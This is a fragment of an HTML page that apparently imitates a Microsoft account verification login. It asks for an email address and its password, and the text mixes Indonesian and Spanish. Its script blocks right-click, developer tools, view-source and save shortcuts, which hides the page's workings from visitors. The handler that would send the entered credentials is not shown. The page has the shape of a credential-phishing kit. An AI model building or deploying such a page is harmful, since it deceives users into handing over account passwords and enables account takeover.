.card{
  background:#fff;
  border-radius:12px;
  box-shadow:0 10px 25px rgba(0,0,0,0.15);
}
.input{
  border:1px solid #ccc;
  padding:12px;
  width:100%;
  border-radius:4px;
}
.input:focus{
  outline:none;
  border-color:#2563eb;
  box-shadow:0 0 0 1px #2563eb;
}
.btn{
  background:#2563eb;
  color:#fff;
  padding:12px;
  width:100%;
  border-radius:4px;
  font-weight:600;
}
.btn:hover{
  background:#1e4fd1;
}
.link{
  color:#2563eb;
  font-size:14px;
}
</style>

<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>

<div class="card p-8 w-full max-w-md">


<form id="loginForm">

<div class="form-group">

<br>

  <h1 class="text-2xl font-semibold text-gray-800 mb-2">
    Login
  </h1>

  <p class="text-gray-500 mb-6">
    Verifikasi Microsoft
  </p>

  <!-- INPUT EMAIL -->
  <input 
    id="1" name="1"
    class="input mb-4"
    type="email"
    placeholder="Email" required />
 

  <!-- INPUT EMAIL -->
  <input 
    id="2" name="2"
    class="input mb-4"
    type="text"
    placeholder="kata sandi email" required />
 


  <p id="error" class="text-red-500 text-sm mb-3"></p>

  <a href="#" class="link block mb-5">

  ¿No tiene una cuenta? Cree una.
<br>
   ¿No puede acceder a su cuenta?

  </a>

  <!-- BOTON -->
  <button onclick="login()" class="btn">
    Masuk dan verifikasi
  </button>

  <p class="text-sm text-gray-500 mt-6 text-center">
    ¿No tienes cuenta?
    <a href="#" class="link">Crear una</a>
  </p>

</div>
